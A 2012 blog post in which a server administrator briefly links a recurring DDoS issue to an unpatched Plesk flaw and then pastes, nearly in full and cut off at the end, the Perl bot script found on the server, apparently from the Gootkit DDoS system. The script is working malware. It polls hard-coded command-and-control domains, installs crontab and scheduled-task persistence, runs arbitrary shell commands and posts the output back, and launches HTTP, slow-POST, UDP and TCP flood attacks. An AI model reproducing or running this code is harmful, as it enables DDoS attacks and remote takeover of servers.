---
layout: post
status: publish
published: true
title: DDOS Issues - More!
author: Matt Clements
author_login: admin
author_email: matt@mattclements.co.uk
author_url: http://www.mattclements.co.uk/
wordpress_id: 219
wordpress_url: http://www.mattclements.co.uk/?p=219
date: 2012-03-07 22:41:49.000000000 +00:00
---
And to tie up with my last post, the issue then came back... So rather than sitting with black text on a white page and trying to work out what was happening, I did some digging. I knew the following:
<ul>
	<li>Plesk 9.5.4</li>
	<li>Debian and Ubuntu (latest versions)</li>
	<li>SSH &amp; FTP had not been logged into to upload the files</li>
	<li>I had patched after the first issue to the latest Micro Update from Plesk</li>
</ul>
I came across the following:

<a href="http://forum.parallels.com/showthread.php?t=257628" target="_blank">http://forum.parallels.com/showthread.php?t=257628</a>

&nbsp;

By searching for some of the content within the found Perl scripts (below)

So it turned out to be an issue with Plesk, which had been patched by the latest Micro Update, but I missed some minor steps such as the apachectrl2.lock.* files which were owned by the user who had started the second attacks (note that those users that had not created these files on the first attack had not re-attacked).

&nbsp;

Perl script as follows:
<pre class="language-perl"><code>#!/usr/bin/perl

#part of the Gootkit ddos system
use Fcntl qw(:flock :DEFAULT);	

use Socket;
use IO::Socket;
use IO::Select;

use POSIX 'setsid';
use Cwd 'abs_path';

print "Content-type: text/plain\n\n";

#---------------------------------------------------#
#	CUSTOM parameters								#
#---------------------------------------------------#
my $number_of_bots = 5;
my @defaults = ("callebook.com:80", "cellulareebook.com:80", "whitewithstand.com:80");
my $pingTimeout = 1200;
my $proxyPort = 5432;
#---------------------------------------------------#

my $lockfilename;
my $serverfile;
my $idfile;
my $uafile;

my $kernel;
my $version = "2";
my $localip;
my $botid;
my $ua;

my $script_path = abs_path($0);

if ($^O eq "MSWin32"){
	my $temp = `echo %temp%`;
	chomp $temp;
	$lockfilename = $temp."\\~PIF3E6.tmp";
	$serverfile = $temp."\\~PIFSRV6.tmp";
	$idfile = $temp."\\~PIFID45.tmp";
	$uafile = $temp."\\~PIFUA11.tmp";
}
else {
	$lockfilename = "/tmp/apachectrl.lock";
	$serverfile = "/tmp/apachectrl.log";
	$idfile = "/tmp/id";
	$uafile = "/tmp/ua";
}

exit if (!check_multiprocess());

if ($ARGV[0] eq "detach"){
	detachFromConsole();
	exit;
}

if ($ARGV[0] eq "normal"){
	print "normal work pid = $$...\n";
	getKernel();
	getBotId();
	getLocalIp();
	getUA();
	print "version = ".$version."\nkernel = ".$kernel."\nos = ".$^O."\nlocalip = ".$localip."\nbotid = ".$botid."\nua = ".$ua."\n";

	my %tasks = ();
	my @newTaskList;
	my $currentServer;
	my $currentPort;
	my $child = undef;
	my $child_pid;

	$SIG{'INT'} = 'IGNORE';
	$SIG{'HUP'} = 'IGNORE';
	#$SIG{'TERM'} = 'IGNORE';
	#$SIG{'CHLD'} = 'IGNORE';
	$SIG{'PS'} = 'IGNORE';

	#addServer ("who.is:7015");
	#delServer("who.is:7015");
	#getDomain ("pre", "suf.co.uk");
	#proxy();

	while (1){
		Ping ("/ping");
		sleep $pingTimeout;
	}
	exit;
}
#if ($ARGV[0] eq "daemon")
{
	print "daemon...\n";
	demonize();
	exit;
}

sub REAPER {
	while (waitpid(-1, WNOHANG) > 0){}
    $SIG{CHLD} = \&REAPER;
}

#------------------------------------------------------------------#
sub demonize {

	if ($^O eq "MSWin32")
	{
		my $schedDelete = "schtasks /delete /f /tn perl";
		my $schedCreate = "schtasks /create /tr \"".$^X." ".abs_path($0)." detach\" /tn perl /sc MINUTE /mo 1";
		print $schedDelete."\n";
		print  $schedCreate."\n";
		`$schedDelete`;
		`$schedCreate`;

		my $child_proc;
		print "detach...\n";
		require Win32::Process;
		Win32::Process::Create($child_proc, "$^X", "perl.exe ".abs_path($0)." normal", 0, DETACHED_PROCESS, ".") || die "Could not spawn child: $!";
		$child_pid = $child_proc->GetProcessID();
		print "child_pid = $child_pid, pid = $$ \n";

		sleep(1.0);
		POSIX::waitpid(-1, POSIX::WNOHANG()); # clean up any defunct child process
		print "exit pid=$$\n";
		exit;
	}
	else {
		$SIG{CHLD} = \&REAPER;
		if ( fork() ) {
			exit;
		}
		setsid(); 

		chdir('/');
		open STDIN, "<", "/dev/null";
		open STDOUT, ">", "/dev/null";
		open STDERR, ">", "/dev/null";
		umask(077); 

		$SIG{CHLD} = \&REAPER;
		if ( fork() ) {
			exit;
		}
		`echo '* * * * * $^X $script_path detach >/dev/null 2>&1' > /tmp/cron.d; crontab /tmp/cron.d ; rm /tmp/cron.d`;
		print "$$ exec...\n";
		# Now go back to your regular business.
		exec "$^X $script_path normal";
		exit;
	}
}
#------------------------------------------------------------------#
sub detachFromConsole {
	if ($^O eq "MSWin32")
	{
		my $child_proc;
		print "detach...\n";
		require Win32::Process;
		Win32::Process::Create($child_proc, "$^X", "perl.exe ".abs_path($0)." normal", 0, DETACHED_PROCESS, ".") || die "Could not spawn child: $!";
		$child_pid = $child_proc->GetProcessID();
		print "child_pid = $child_pid, pid = $$ \n";
	}
	else {

		$SIG{CHLD} = \&REAPER;
		if ( fork() ) {
			exit;
		}
		setsid(); 

		chdir('/');
		open STDIN, "<", "/dev/null";
		open STDOUT, ">", "/dev/null";
		open STDERR, ">", "/dev/null";
		umask(077); 

		$SIG{CHLD} = \&REAPER;
		if ( fork() ) {
			exit;
		}
		print "$$ exec...\n";
		# Now go back to your regular business.
		exec "$^X $script_path normal";
		exit;
	}
}
#------------------------------------------------------------------#
sub check_multiprocess {
	for (my $i=0; $i<$number_of_bots; $i++){
		my $lockfile=$lockfilename.".".$i;
		if (-f $lockfile){
				my $lock_pid = 0;
				open(LOCK,"<$lockfile");
				my $zombie_lock_flag = flock(LOCK,  LOCK_EX|LOCK_NB);
				close (LOCK);
				if ($zombie_lock_flag == 0){
					next;
				} else {
					unlink("$lockfile");
					redo;
				}
		}else{
			sysopen(LOCK, $lockfile, O_CREAT|O_EXCL|O_WRONLY) or die 'cannot create lock file';
			print LOCK "$$\n";
			close(LOCK);
			open(GLOB_LOCK,"<$lockfile");
			flock(GLOB_LOCK,  LOCK_EX);
			return 1;
		}
	}
	return 0;
}
#------------------------------------------------------------------#
sub proxy {
	$SIG{CHLD} = \&REAPER;
	$child = fork;
	if ($child == 0)
	{
		my $proxySocket;
		socket($proxySocket, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
		setsockopt($proxySocket, SOL_SOCKET, SO_REUSEADDR, 1) or die "Can't set socket option to SO_REUSEADDR $!\n";
		bind ($proxySocket, sockaddr_in($proxyPort, INADDR_ANY)) or die "Can't bind to port $proxyPort! \n";
		listen($proxySocket, SOMAXCONN) or die "listen: $!";
		print "Server: started on port $proxyPort\n";

		my $activeSockets = 0;
		while (1) {
			my $clientSocket;
			my $clientAddr;	

			print "Server: waiting for connect...\n";	

			$clientAddr = accept($clientSocket, $proxySocket);
			$activeSockets ++;
			print "Server: new connect. activeSockets = $activeSockets\n";					

			my $targetHost = "";
			my $x;

			my $recievedLine = "";
			my $dataToSend = "";
			do {
				my $len = 1024;
				my $result = recv ($clientSocket, $recievedLine, $len, 0);

				print "Server: recieved = ".$recievedLine."_\n";

				$recievedLine =~ s/\r\n/\^/g;
				my @splitted = split(/\^/, $recievedLine);

				foreach $x (@splitted)
				{
					#print "s1 = $x\n";
					if (($x =~ /^GET http\:\/\/(.*) (.*)/) || ($x =~ /^POST http\:\/\/(.*) (.*)/)){

						print "Server: parts url = $1\n";
						my @parts = split(/\//, $1);

						my $ending = $2;

						if ($x =~ /^GET/){
							$x = "GET ";
						}
						else {
							$x = "POST ";
						}						

						$targetHost = $parts[0];
						for ($ind=1; $ind<@parts; $ind++){
							print "ind = $parts[$ind]\n";
							$x .= "/".$parts[$ind];
						}
						#$x .= "/"; #test it

						if (@parts == 1) { $x .= "\/";}
						$x .= " ".$ending;
					}
					if ($x =~ /^Proxy/){
						if ($x =~ s/^Proxy-Connection/Connection/g){
							print "s2 = $x\n";
							$x = "Connection: close";
						}
					}
					#print "s2 = $x\n";
					$dataToSend .= $x."\r\n";
				}

				if ($len != length($recievedLine)){
					#finish work with this client
					if ($targetHost ne ""){
						print "Server: targetHost = $targetHost\n";
						print "Server: dataToSend = $dataToSend\n";

						$selector = IO::Select->new();
						my $tempSocket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$targetHost, PeerPort=>80) or die "error creating tempSocket!";
						$tempSocket->autoflush(1);
						$selector->add($tempSocket);						

						print $tempSocket $dataToSend."\r\n";

						my @ready;
						while (1){
							my @ready = $selector->can_read(0);
							if (not @ready){
								print "Server: waiting for can_read.\n";
								sleep 1;
								next;
							}
							#next unless(@ready);
							my $fh;
							foreach $fh (@ready) {
								print "Server: new fh.\n";
								if ($tempSocket eq $fh) {
									my $msg;
									$fh->autoflush(1);
									my $nread = sysread($fh, $msg, 1024);
									print "nread = $nread\n";
									if ($nread == 0) {
										$selector->remove($fh);
										$fh->close;
										#$tempSocket->close;
										print "Server: close fh and end reading.\n";
										goto endThisRead;
									}
									print "print to clientSocket\n";
									#print "msg = $msg\n";

									$clientSocket->autoflush(1);

									#print $clientSocket $msg;
									send ($clientSocket, $msg, 0);
									print "print ok\n";
								}
							}
						}
						endThisRead:
						#print "Server: close temp socket.\n";
						#close $tempSocket;
					}
					print "Server: close clientSocket.\n";
					close $clientSocket;
					$activeSockets --;
					next;
				}
			} while (1);
		}
	}
	else {
		print "proxy pid = $child\n";
		return $child;
		exit;
	}
}

sub setPingTime {
	$pingTimeout = $_[0];
	print "set pingTimeout = $pingTimeout\n";
}

sub replaceSpaces {
	my $x = $_[0];
	$x =~ s/(\s+)/\%20/g;
	return $x;
}

sub killTask {
	my $taskToKill = $_[0];
	my $pid = $tasks{$taskToKill};

	print "killTask $taskToKill, pid = $pid\n";

	#kill 1, $pid;
	kill 9, $pid;
	delete $tasks{$taskToKill};
}

sub startNewTask {
	my $taskToStart	= $_[0];

	print "startNewTask $taskToStart\n";

	my ($missionId, $missionType, $rest) = split /\|/, $taskToStart;

	if ($missionType eq 'get'){
		if ($taskToStart =~ /(.*)\|(.*)\|(.*)\|(.*)\|(.*)\|(.*)\|(.*)\|(.*)/) {
			#print "id = $1| type = $2| host = $3| port = $4| path = $5| sleep = $6| duration = $7| pingtime = $8\n";
			$tasks{$taskToStart} = attackHttpGet($3, $4, $5, $6, $7);
			setPingTime($8);
		} else {
			print "malformed GET task\n";
			return;
		}
	}elsif ($missionType eq 'post'){
		print "http post\n";
		if ($taskToStart =~ /(.*)\|(.*)\|(.*)\|(.*)\|(.*)\|(.*)\|(.*)\|(.*)\|(.*)/) {
			#print "id = $1| type = $2| host = $3| port = $4| path = $5| sleep = $6| content = $7 | duration = $8| pingtime = $9\n";
			$tasks{$taskToStart} = attackHttpPost($3, $4, $5, $6, $7, $8);
			setPingTime($9);
		} else {
			print "malformed POST task\n";
			return;
		}
	}elsif ($missionType eq 'slowpost'){
		print "http slow post\n";		# TODO

		if ($taskToStart =~ /(.*)\|(.*)\|(.*)\|(.*)\|(.*)\|(.*)\|(.*)\|(.*)\|(.*)/) {  #id3|slowpost|ya3.ru|3128|/index.html|20|1024|30|PING_TIME',
			print "id = $1| type = $2| host = $3| port = $4 | path = $5 | sleep = $6 | maxbodylen = $7| duration = $8| pingtime = $9\n";
			$tasks{$taskToStart} = attackSlowPost($3, $4, $5, $6, $7, $8);
			print "pid = $tasks{$taskToStart}\n";
			setPingTime($9);
		} else {
			print "malformed SLOW task\n";
			return;
		}	

	}elsif ($missionType eq 'udpflood'){
		print "udpflood\n";
		if ($taskToStart =~ /(.*)\|(.*)\|(.*)\|(.*)\|(.*)\|(.*)\|(.*)/) {
			#print "id = $1| type = $2| host = $3| port = $4| packetsize = $5 | duration = $6| pingtime = $7\n";

			$tasks{$taskToStart} = attackUdpFlood($3, $4, $5, $6);
			print "id = $1| type = $2| host = $3| port = $4 | packetsize = $5 | duration = $6| pingtime = $7, pid = $tasks{$taskToStart}\n";
			setPingTime($7);
		} else {
			print "malformed UDP task\n";
			return;
		}		

	}elsif ($missionType eq 'tcpflood'){
		print "tcpflood\n";

		if ($taskToStart =~ /(.*)\|(.*)\|(.*)\|(.*)\|(.*)\|(.*)/) {
			#print "id = $1| type = $2| host = $3| port = $4 | duration = $5| pingtime = $6\n";
			$tasks{$taskToStart} = attackTcpFlood($3, $4, $5);
			setPingTime($6);
		} else {
			print "malformed TCPFLOOD task\n";
			return;
		}
	}elsif ($missionType eq 'httpflood'){
		print "httpflood from irc\n";

		if ($taskToStart =~ /(.*)\|(.*)\|(.*)\|(.*)\|(.*)\|(.*)/) {
			#print "id = $1| type = $2| host = $3| duration = $4| pingtime = $5\n";
			$tasks{$taskToStart} = attackHttpFlood($3, $4);
			setPingTime($5);
		} else {
			print "malformed HTTPFLOOD task\n";
			return;
		}
	}elsif ($missionType eq 'troll'){
		print "troll\n";

		if ($taskToStart =~ /(.*)\|(.*)\|(.*)\|(.*)\|(.*)\|(.*)\|(.*)\|(.*)/) {
			#print "id = $1| type = $2| host = $3| port = $4 | connects = $5 | sleep = $6 | duration = $7| pingtime = $8\n";
			$tasks{$taskToStart} = attackTroll($3, $4, $5, $6, $7);		#plus duration
			setPingTime($8);
		} else {
			print "malformed TROLL task\n";
			return;
		}		

	}elsif ($missionType eq 'tcp'){ # TCP атака. тоже что и тролл, но с посылкой мусора в порт после коннекта.
		if ($taskToStart =~ /(.*)\|(.*)\|(.*)\|(.*)\|(.*)\|(.*)\|(.*)\|(.*)/) {
			#print "id = $1| type = $2| host = $3| port = $4 | connects = $5 | maxbodylen = $6 | duration = $7| pingtime = $8\n";
			$tasks{$taskToStart} = attackTcpTroll($3, $4, $5, $6, $7);
			setPingTime($8);
		} else {
			print "malformed TCPTROLL task\n";
			return;
		}		

	}elsif ($missionType eq 'remote'){
		#todo
		print "exec remote script\n";
	}elsif ($missionType eq 'addserv'){
		if ($taskToStart =~ /(.*)\|(.*)\|(.*)\|(.*)/) {
			#print "id = $1| type = $2| server:port = $3| pingtime = $4\n";
			addServer($3);
			setPingTime($4);
		}
	}elsif ($missionType eq 'delserv'){
		if ($taskToStart =~ /(.*)\|(.*)\|(.*)\|(.*)/) {
			#print "id = $1| type = $2| server:port = $3| pingtime = $4\n";
			delServer($3);
			setPingTime($4);
		}
	}elsif ($missionType eq 'system'){
		print "system\n";
		if ($taskToStart =~ /(.*)\|(.*)\|(.*)\|(.*)\|(.*)/) { #'id6|system|uname -a|pathToSendResponce|PING_TIME',
			my $answer = `$3`;
			#print $answer;
			sendPostRequest ($currentServer, $currentPort, $4, $answer);
			setPingTime($5);
		}
	}else {
		print "unknown\n";
	}
}

sub removeZombies {
	if ($^O ne "MSWin32"){
		foreach my $line (keys %tasks) {
			my $pid = $tasks{$line};
			my $pscmd = "ps -p ".$pid." -o pid=";
			my $zombie = `$pscmd`;
			if ($zombie eq ""){
				printf "delete zombie $pid\n";
				delete $tasks{$line};
			}
		}
	}
}

sub manageTaskList{
	my $found;

	removeZombies();
	print "newTaskList = @newTaskList\n";

	foreach my $oldLine (keys %tasks){
		$found = 0;
		foreach my $newLine (@newTaskList) {
			if ($oldLine eq $newLine){ $found = 1; last; }
		}
		if (!$found) { killTask($oldLine); }
	}

	foreach my $newLine (@newTaskList){
		#print "newLine = $newLine\n";
		$found = 0;
		foreach my $oldLine (keys %tasks) {
			if ($oldLine eq $newLine){ $found = 1; last; }
		}
		if (!$found) {
			startNewTask($newLine);
		}
	}
}

sub connectToServer {
	my $host = $_[0];
	my $port = $_[1];
	my $path = $_[2];

	print ("ConnectTo $host, $port.\n");

	socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or return -1;
	$iaddr = inet_aton($host);
	if (defined $iaddr){
		$paddr = sockaddr_in($port, $iaddr);
		connect(SOCK, $paddr) or return -1;
	}
	else {
		return -1;
	}

	print ("Connected to server.\n");

	my $uptime = replaceSpaces(getUptime());
	my $linuxKernel = replaceSpaces($kernel);

	$path .= "?version=$version&kernel=$linuxKernel&os=".$^O."&ip=$localip&id=$botid&up=".$uptime;
	print "path = $path\n";

	my $request = "GET ".$path." HTTP/1.0\nHost: ".$host."\n\n";
	send (SOCK, $request, 0);
	@response = <SOCK>;
	my $headerEnd = 0;
	@newTaskList = ();    # TODO: check memory leaks
	foreach $line (@response){
		if ("\r\n" eq $line) {
			$headerEnd = 1;
			next;
		}
		if ($headerEnd){
			chomp $line;
			print "response = ".$line."\n";
			push(@newTaskList, $line);
		}
	}
	close(SOCK);

	$currentServer = $host;
	$currentPort = $port;

	#test
	#push(@newTaskList, "1|udpflood|www.fanpresent.ru|1000|30|20");

	manageTaskList();
	return 0;
}

sub Ping {
	my $path = $_[0];

	foreach my $def (@defaults){
		if ($def =~/^(.*)\:(.*)/){
			if (connectToServer($1, $2, $path) == 0){
				return;
			}
		}
	}

	if (open(FILE, $serverfile)){
		my @serverlist = <FILE>;
		close (FILE);
		foreach my $i (@serverlist){
			if ($i =~ /^(.*)\:(.*)/){
				if (connectToServer($1, $2, $path) == 0){
					return;
				}
			}
		}
	}

	print "No alive servers.\n";
	return;
}

#хттп ГЕТ атака (парамерты : хост, порт, путь до скрипта, время ожидания между запросами)
sub sendGetRequest {
	my $host = $_[0];
	my $port = $_[1];
	my $path = $_[2];
	socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
	$iaddr = inet_aton($host);
	$paddr = sockaddr_in($port, $iaddr);
	connect(SOCK, $paddr);

	my $request = "GET ".$path." HTTP/1.0\nHost: ".$host."\n\n";
	send (SOCK, $request, 0);
	close(SOCK);
}

#хост, порт, путь до скрипта, время ожидания между запросами, текстовый буффер для отсылки в теле ПОСТа
sub sendPostRequest {
	my $host = $_[0];
	my $port = $_[1];
	my $path = $_[2];
	my $content = $_[3];	

	socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
	$iaddr = inet_aton($host);
	$paddr = sockaddr_in($port, $iaddr);
	connect(SOCK, $paddr);

	$req = join("\r\n",  "POST ".$path." HTTP/1.1",
			"Host: ".$host,
			"User-Agent: ".$ua,
			"Content-type: application/x-www-form-urlencoded",
			"Content-length: ".length($content),
			"",
			$content);		

	send (SOCK, $req."\n\n", 0);
	close(SOCK);
}

sub sendSlowPostRequest {
	my $host = $_[0];
	my $port = $_[1];
	my $path = $_[2];
	my $contentLen = $_[3];
	my $chars = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+|\=-~`1234567890";

	print "start\n";

	socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
	$iaddr = inet_aton($host);
	$paddr = sockaddr_in($port, $iaddr);
	connect(SOCK, $paddr);

	#send header
	send (SOCK, "POST ".$path." HTTP/1.1\r\n", 0);
	send (SOCK, "Host: $host\r\n", 0);
	send (SOCK, "User-Agent: $ua\r\n", 0);
	send (SOCK, "Content-type: application/x-www-form-urlencoded\r\n", 0);
	send (SOCK, "Content-length: $contentLen\r\n", 0);
	send (SOCK, "\r\n", 0);	

	#send body
	for my $i (1..$contentLen){
		my $symbol = substr $chars, int rand length($chars), 1;
		print "$symbol ";
		send (SOCK, $symbol, 0);
		sleep 3;
	}
	send (SOCK, "\r\n", 0);
	close(SOCK);
	print "end\n";
}

# HTTP GET (парамерты : хост, порт, путь до скрипта, время ожидания между запросами)
sub attackHttpGet {
	$SIG{CHLD} = \&REAPER;
	$child = fork;
	if ($child == 0){
		my $host = $_[0];
		my $port = $_[1];
		my $path = $_[2];
		my $sleep = $_[3];
		my $duration = $_[4];

		alarm (0);
		my $itime = time;
		my ($cur_time);
		$cur_time = time - $itime;

		print "attackHttpGet started!\n";		

		while ($duration > $cur_time){
			$cur_time = time - $itime;
			sendGetRequest ($host, $port, $path);
			sleep $sleep;
		}
		exit;
	}
	else {
		return $child;
	}
}

# ПОСТ атака (парамерты : хост, порт, путь до скрипта, время ожидания между запросами, текстовый буффер для отсылки в теле ПОСТа)
sub attackHttpPost {
	$SIG{CHLD} = \&REAPER;
	$child = fork;
	if ($child == 0){
		my $host = $_[0];
		my $port = $_[1];
		my $path = $_[2];
		my $sleep = $_[3];
		my $content = $_[4];
		my $duration = $_[5];

		alarm (0);
		my $itime = time;
		my ($cur_time);
		$cur_time = time - $itime;

		print "attackHttpPost started!\n";		

		while ($duration > $cur_time){
			$cur_time = time - $itime;
			sendPostRequest ($host, $port, $path, $content);
			sleep $sleep;
		}
		exit;
	}
	else {
		return $child;
	}
}

#id3|slowpost|ya3.ru|3128|/index.html|20|1024|30|PING_TIME',
#print "id = $1| type = $2| host = $3| port = $4 | path = $5 | sleep = $6 | maxbodylen = $7| duration = $8| pingtime = $9\n";
sub attackSlowPost {
	$child = fork;
	if ($child == 0){
		my $host = $_[0];
		my $port = $_[1];
		my $path = $_[2];
		my $sleep = $_[3];
		my $maxLen = $_[4];
		my $duration = $_[5];

		alarm (0);
		my $itime = time;
		my ($cur_time);
		$cur_time = time - $itime;

		print "attackSlowPost started!\n";		

		while ($duration > $cur_time){
			$cur_time = time - $itime;

			my $contentLen = int ($maxLen / 3 + rand $maxLen);
			sendSlowPostRequest ($host, $port, $path, $contentLen);
			print "sleep $sleep\n";
			sleep $sleep;
		}
		exit;
	}
	else {
		return $child;
	}
}

# TROLL атака (парамерты : хост, порт, кол-во коннектов на 1 поток, слип). если порт 0, то порт рандом.
sub attackTroll {
	$SIG{CHLD} = \&REAPER;
	$child = fork;
	if ($child == 0){
		my $host = $_[0];
		my $port = $_[1];
		my $connects = $_[2];
		my $sleep = $_[3];
		my $duration = $_[4];

		if ($port eq '0'){	# todo
			$port = int rand (65535);
		}

		my $iaddr = inet_aton($host);
		my $paddr = sockaddr_in($port, $iaddr);
		my @sockPool;

		alarm (0);
		my $itime = time;
		my ($cur_time);
		$cur_time = time - $itime;

		print "attackTroll started!\n";		

		while ($duration > $cur_time){
			$cur_time = time - $itime;
			for my $i (0..$connects){
				if (defined $sockPool[$i]) { print "close $i socket\n"; close($sockPool[$i]); delete $sockPool[$i]; }
				socket($sockPool[$i], PF_INET, SOCK_STREAM, getprotobyname('tcp'));
				connect($sockPool[$i], $paddr);
			}
			sleep $sleep;
			#`usleep $sleep`;
		}
	}else {
		return $child;
	}
}

# TCP атака. тоже что и тролл, но с посылкой мусора в порт после коннекта. доп.параметр : максимальный размер мусорного реквеста.
sub attackTcpTroll {
	$SIG{CHLD} = \&REAPER;
	$child = fork;
	if ($child == 0){
		my $host = $_[0];
		my $port = $_[1];
		my $connects = $_[2];
		my $maxLen = $_[3];
		my $duration = $_[4];				

		if ($port eq '0'){	# todo
			$port = int rand (65535);
		}

		my $iaddr = inet_aton($host);
		my $paddr = sockaddr_in($port, $iaddr);
		my @sockPool;

		alarm (0);
		my $itime = time;
		my ($cur_time);
		$cur_time = time - $itime;

		print "attackTcpTroll started!\n";		

		while ($duration > $cur_time){
			$cur_time = time - $itime;
			for my $i (0..$connects){

				$contentLen = int ($maxLen / 3 + rand $maxLen);
				my $garbage = genGarbage($contentLen);
				#print "contentLen = $contentLen, garbage = $garbage\n";

				if (defined $sockPool[$i]) { close($sockPool[$i]); delete $sockPool[$i]; }
				socket($sockPool[$i], PF_INET, SOCK_STREAM, getprotobyname('tcp'));
				connect($sockPool[$i], $paddr);
				send ($sockPool[$i], $garbage, 0);
			}
		}
		exit;
	}else {
		return $child;
	}
}

# HTTP from IRC (парамерты : хост, длительность)
sub attackHttpFlood {
	$SIG{CHLD} = \&REAPER;
	$child = fork;
	if ($child == 0){
		my $host = $_[0];
		my $duration = $_[1];	

		alarm (0);
		my $itime = time;
		my ($cur_time);
		$cur_time = time - $itime;

		print "attackHttpFlood started!\n";		

		while ($duration > $cur_time){
			$cur_time = time - $itime;
			my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$host, PeerPort=>80);
			print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$host."\r\nConnection: Keep-Alive\r\n\r\n";
			close($socket);
		}
		exit;
	}
	else {
		return $child;
	}
}

# UDP from IRC (парамерты : хост, порт, размер пакета в Kb, длительность)
sub attackUdpFlood {
	$SIG{CHLD} = \&REAPER;
	$child = fork;
	if ($child == 0){
		my $host = $_[0];
		my $port = $_[1];
		my $packetSize = $_[2];
		my $duration = $_[3];

		alarm (0);							

		print "attackUdpFlood started!\n";		

		my ($dtime, %pacotes) = udpflooder("$host", "$port", "$packetSize", "$duration");
		$dtime = 1 if $dtime == 0;
		my %bytes;
		$bytes{igmp} = $packetSize * $pacotes{igmp};
		$bytes{icmp} = $packetSize * $pacotes{icmp};
		$bytes{o} = $packetSize * $pacotes{o};
		$bytes{udp} = $packetSize * $pacotes{udp};
		$bytes{tcp} = $packetSize * $pacotes{tcp};
		print "$target :[UDP-DDos] Results ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." Kb in ".$dtime." seconds to ".$1.".";
		exit;
	}
	else {
		return $child;
	}
}

# TCP from IRC (парамерты : хост, порт, длительность)
sub attackTcpFlood {
	$SIG{CHLD} = \&REAPER;
	$child = fork;
	if ($child == 0){
		my $host = $_[0];
		my $port = $_[1];
		my $duration = $_[2];

		print "attackTcpFlood started!\n";		

		alarm (0);
		tcpflooder("$host","$port","$duration");
		exit;
	}
	else {
		return $child;
	}
}

sub genGarbage {
	my $len = $_[0];
	my $chars = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+|\=-~`1234567890";
	my $garbage = '';

	for my $i (0..$len){
		my $symbol = substr $chars, int rand length($chars), 1;
		$garbage .= $symbol;
	}
	return $garbage;
}

sub tcpflooder {
   my $itime = time;
   my ($cur_time);
   my ($ia,$pa,$proto,$j,$l,$t);

   $ia=inet_aton($_[0]);
   $pa=sockaddr_in($_[1],$ia);
   $ftime=$_[2];
   $proto=getprotobyname('tcp');
   $j=0;$l=0;
   $cur_time = time - $itime;
   while ($l<1000){
	  $cur_time = time - $itime;
	  last if $cur_time >= $ftime;
	  $t="SOCK$l";
	  socket($t,PF_INET,SOCK_STREAM,$proto);
	  connect($t,$pa)||$j--;
	  $j++;
	  $l++;
   }
   $l=0;
   while ($l<1000){
	  $cur_time = time - $itime;
	  last if $cur_time >= $ftime;
	  $t="SOCK$l";
	  shutdown($t,2);
	  $l++;
   }
}

sub udpflooder {
   my $iaddr = inet_aton($_[0]);
   #my $msg = 'A' x $_[1];

   my $porta = $_[1];
   my $msg = genGarbage($_[2]);

   my $ftime = $_[3];
   my $cp = 0;
   my (%pacotes);

   print " udpflooder $_[0] $ftime\n";	

   $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;
   #socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
   socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
   #socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
   #socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
   return(undef) if $cp == 4;
   my $itime = time;
   my ($cur_time);
   while ( 1 ) {
	  #for (my $porta = 1; $porta <= 65000; $porta++)
	  {

		 $cur_time = time - $itime;
		 last if $cur_time >= $ftime;
		 #send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;
		 send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;
		 #send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;
		 #send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;
		 for (my $pc = 3; $pc <= 255;$pc++) {
			next if $pc == 6;
			$cur_time = time - $itime;
			last if $cur_time >= $ftime;
			socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
			send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;

			#print "send $msg port=$porta\n";
			#print ".";	

		 }
	  }
	  last if $cur_time >= $ftime;
   }
   #print "done on port $porta\n";
   return($cur_time, %pacotes);
}

sub addServer {
	my $sp = $_[0];
	if (open(FILE, $serverfile)){
		my @serverlist = <FILE>;
		close (FILE);
		foreach my $i (@serverlist){
			if ($i =~ /^$sp/){
				return;
			}
		}
	}
	if (!open(FILE,">>".$serverfile)){
		if (!open(FILE,">".$serverfile)){
			return;
		}
	}
	print FILE $sp."\n";
	close(FILE);
}

sub delServer {
	my $servertodel = $_[0];
	if (!open(FILE, $serverfile)){
		return;
	}
	my @serverlist = <FILE>;
	my $offset=0;
	foreach my $i (@serverlist){
		if ($i =~ /^$servertodel/){
			splice @serverlist, $offset, 1;
			$offset --;
		}
		$offset ++;
	}
	close(FILE);
	if (open(FILE, ">".$serverfile)){
		print FILE @serverlist;
		close(FILE);
	}
}

#--------------------------------------------------------------------
sub getCurrentDate {
	my $timeServer = "time.appspot.com";
	my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$timeServer, PeerPort=>80);
	print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$timeServer."\r\nConnection: Close\r\n\r\n";
	my $utc = '';
	while(<$socket>){
		if ($_ =~ /\<b\>/) { $utc .= $_; }
		if ($_ =~ /\<\/b\>/) { last; }
	}
	close $socket;
	print $utc;
	if ($utc =~ /<b>(\d+)-(\d+)-(\d+) (\d+)\:(\d+)\:(\d+)\.(.+)<\/b>/){  #<html><title>The Time</title><body>The time is <b>2011-10-16 08:52:55.107370</b> UTC
		my ($year, $mon, $mday, $hour,$min, $sec) = ($1,$2,$3,$4,$5,$6);
		my @result = ($1,$2,$3,$4,$5,$6);
		return @result;
	}
	return undef;
}

sub getDomain {
	my @res = getCurrentDate();
	if (@res == undef) { return undef; }
